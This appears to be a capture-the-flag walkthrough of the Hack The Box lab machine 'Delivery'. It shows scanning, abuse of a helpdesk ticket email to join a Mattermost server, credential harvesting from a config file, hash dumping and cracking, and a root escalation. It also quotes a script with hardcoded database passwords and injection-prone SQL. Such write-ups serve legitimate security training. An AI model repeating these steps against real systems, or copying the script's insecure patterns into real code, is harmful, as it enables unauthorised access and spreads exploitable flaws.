## Default Information
IP Address: 10.10.10.222\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.140    delivery.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.222 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-25 02:05:03 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.222                                    
Discovered open port 8065/tcp on 10.10.10.222                                  
Discovered open port 80/tcp on 10.10.10.222
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | Open |
| 80	| HTTP | nginx 1.14.2 | Open |
| 8065	| Unknown | NIL | Open |

Even though the service at port 8065 is unknown, visitng http://delivery.htb:8065 reveals that this is a mattermost server.

From the nmap outputs, we are also able to discover another site http://helpdesk.delivery.htb and we will add helpdesk.delivery.htb into the /etc/hosts file.

```
10.10.10.140    helpdesk.delivery.htb    delivery.htb
```

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://delivery.htb. However, for this machine, it seems that there is not much endpoints that we can work with.

```
http://10.10.10.222:80/assets               (Status: 301) [Size: 185] [--> http://10.10.10.222/assets/]
http://10.10.10.222:80/error                (Status: 301) [Size: 185] [--> http://10.10.10.222/error/]
http://10.10.10.222:80/images               (Status: 301) [Size: 185] [--> http://10.10.10.222/images/]
http://10.10.10.222:80/index.html           (Status: 200) [Size: 10850]
```

Next, we use Gobuster to find the endpoints that are accessible from http://helpdesk.delivery.htb.

```
http://helpdesk.delivery.htb/images               (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/images/]
http://helpdesk.delivery.htb/pages                (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/pages/]
http://helpdesk.delivery.htb/apps                 (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/apps/]
http://helpdesk.delivery.htb/assets               (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/assets/]
http://helpdesk.delivery.htb/css                  (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/css/]
http://helpdesk.delivery.htb/includes             (Status: 403) [Size: 169]
http://helpdesk.delivery.htb/js                   (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/js/]
http://helpdesk.delivery.htb/kb                   (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/kb/]
http://helpdesk.delivery.htb/api                  (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/api/]
http://helpdesk.delivery.htb/include              (Status: 403) [Size: 169]
http://helpdesk.delivery.htb/scp                  (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/scp/]
http://helpdesk.delivery.htb/included             (Status: 403) [Size: 169]
http://helpdesk.delivery.htb/includemanager       (Status: 403) [Size: 169]
http://helpdesk.delivery.htb/includedcontent      (Status: 403) [Size: 169
```

### Web-content discovery

Searching for CVEs for mattermost online and on exploitdb did not return any promising results. So, this is a deadend. We will proceed to explore the rest of the pages to find for anything interesting.

At http://helpdesk.delivery.htb/open.php, we realize that we are able to create a new ticket

![Creating a new ticket](https://github.com/joelczk/writeups/blob/main/HTB/Images/Delivery/new_ticket.png?raw=true)

After the new ticket has been created, we will be able to check the status of the ticket using our ticket id

![Created a new ticket](https://github.com/joelczk/writeups/blob/main/HTB/Images/Delivery/new_ticket_created.png?raw=true)

Using our email and ticket number, we will then be able to check our ticket status at http://helpdesk.delivery.htb/tickets.php

![Checking created tickets](https://github.com/joelczk/writeups/blob/main/HTB/Images/Delivery/check_tickets.png?raw=true)

Apart from that, we realize that there is a field below for us to post our replies. My first thought for this was XSS, but in this case XSS is not very useful in helping us to obtain access to the server. I have also tried to send HTTP interactions from the field below, but they are all unsuccessful.

Let's first take a look at the mattermost server on port 8065. Since we do not have a user, let us first register for a user from http://delivery.htb:8065/signup_email. However, upon successful registration, we realize that we would have to obtain the credentials from our email. From here, we 
will probably need to use a @delivery.htb to obtain the credentials.
![Verify email](https://github.com/joelczk/writeups/blob/main/HTB/Images/Delivery/verify_email.png?raw=true)

## Exploit
### Gaining access to Mattermost channel
We notice that when we are checking the status of the ticket using the ticket id, we are given a @delivery.htb email address
![Finding @delivery.htb email](https://github.com/joelczk/writeups/blob/main/HTB/Images/Delivery/exploit_new_ticket.png?raw=true)

We will then make use of this email address to register for a new user on Mattermost. Upon refreshing http://helpdesk.delivery.htb/tickets.php, we realize that we obtain a link to verify our email address.
![Verify Email](https://github.com/joelczk/writeups/blob/main/HTB/Images/Delivery/verify_email.png?raw=true)

Afterwards, we will be able to login using the credentials that we have used to register and we will be able to join the internal channel. In the channel itself, we are able to find some credentials.

![Obtaining credentials](https://github.com/joelczk/writeups/blob/main/HTB/Images/Delivery/credentials.png?raw=true)

### Obtaining user flag
Using the credentials, we can SSH into the server and obtain the user flag

```
┌──(kali㉿kali)-[~]
└─$ ssh maildeliverer@10.10.10.222   
maildeliverer@10.10.10.222's password: 
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ cat user.txt
<Redacted User flag>
maildeliverer@Delivery:~$ 
```

### Gaining access to SQL server
First, we will try to check the permissions of the user using ```sudo -l```. However, this user is unable to run sudo commands.

```
maildeliverer@Delivery:~$ sudo -l
[sudo] password for maildeliverer: 
Sorry, user maildeliverer may not run sudo on Delivery.
```

However what is interesting is that using the LinEnum script, we can find a process binary where the owner is the ```mattermost``` user.

```
[-] Process binaries and associated permissions (from above list):
1.2M -rwxr-xr-x 1 root       root       1.2M Apr 18  2019 /bin/bash
1.5M -rwxr-xr-x 1 root       root       1.5M Oct 24  2020 /lib/systemd/systemd
144K -rwxr-xr-x 1 root       root       143K Oct 24  2020 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root       root       227K Oct 24  2020 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root       root        55K Oct 24  2020 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root       root       663K Oct 24  2020 /lib/systemd/systemd-udevd
 85M -rwxrwxr-x 1 mattermost mattermost  85M Dec 18  2020 /opt/mattermost/bin/mattermost
```

Navigating to /opt/mattermost/config/config.json, we are able to obtain the database connection string 

```
    "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    },
```

With the username and password, we can access then gain access to the database.

```
maildeliverer@Delivery:~$ mysql -u mmuser -p
Enter password: 
MariaDB [(none)]> 
```

Next, we will use the configure the sql server to use the mattermost database, and also obtain the hashed password from the root user.

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> use mattermost;
Database changed
MariaDB [mattermost]> show tables;
MariaDB [mattermost]> select Username,Password,AuthData,AuthService from Users where Username="root";
+----------+--------------------------------------------------------------+----------+-------------+
| Username | Password                                                     | AuthData | AuthService |
+----------+--------------------------------------------------------------+----------+-------------+
| root     | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | NULL     |             |
+----------+--------------------------------------------------------------+----------+-------------+
```

### Cracking root password
Next, we will need to identify the type of hash using ```hashid```. From the output, this is most likely a bcrypt hash with Hashcat mode of 3200

```
┌──(kali㉿kali)-[~]
└─$ hashid -m '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'             1 ⚙
Analyzing '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
```

From the mattermost channel, we can see that there may be password reuse with the variants of "PleaseSubscribe!", and we also know that we can potentially crack these variants using hashcat.

![](https://github.com/joelczk/writeups/blob/main/HTB/Images/Delivery/root_password.png?raw=true)

Before we continue, let's first add the hash into hash.txt

```
root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```

Afterwards, we will also create a password file containing the "PleaseSubscribe!" text.

Knowing that there might be a password reuse of the same password variants, we will use hashcat to try to crack the hash for variants of "PleaseSubscribe!"

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 3200 hash.txt password.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.1.1) starting...
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
```

### Privilege Escalation to root
Obtaining the cracked password, we will try to use the password to escalate our user to become a root user

```
maildeliverer@Delivery:~$ su root
Password: 
root@Delivery:/home/maildeliverer# 
```

### Obtaining root flag

```
root@Delivery:/home/maildeliverer# cat /root/root.txt
<Redacted root flag>
```
## Post-Exploitation
### Sudo privilege escalation
Using the LinEnum script, we are able to identify that the sudo version used is 1.8.27. However, in this case we are unable to execute the privilege escalation exploit as specified in CVE-2019-14287 because the ```maildeliverer``` user is unable to execute sudo commands.

```
### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.27
```

### osTicket
In the /root directory, we notice that there is a py-smtp.py which seems to be the code for creating and updating tickets on http://helpdesk.delivery.htb/tickets.php. Viewing that file, we are able to obtain the credentials to the osTicket SQL database.

```
if re.search(r'^[0-9]*@delivery.htb$', rcpttos):
    ticket = rcpttos.split('@')[0]
    db = pymysql.connect("localhost","ost_user","!H3lpD3sk123!", "osticket" )
    cursor = db.cursor()
    cursor.execute(f"SELECT ticket_id from ost_ticket where number = '{ticket}'")
    result = cursor.fetchone()[0]
    if result:
        cursor.execute(f"UPDATE ost_thread_entry SET body = '{data}' WHERE thread_id = '{result}'")
        db.commit()
    db.close()
```

Apart from that, we realize that we are able to obtain access to http://helpdesk.delivery.htb/scp/login.php using the credentials that we have obtained in the mattermost channel earlier. 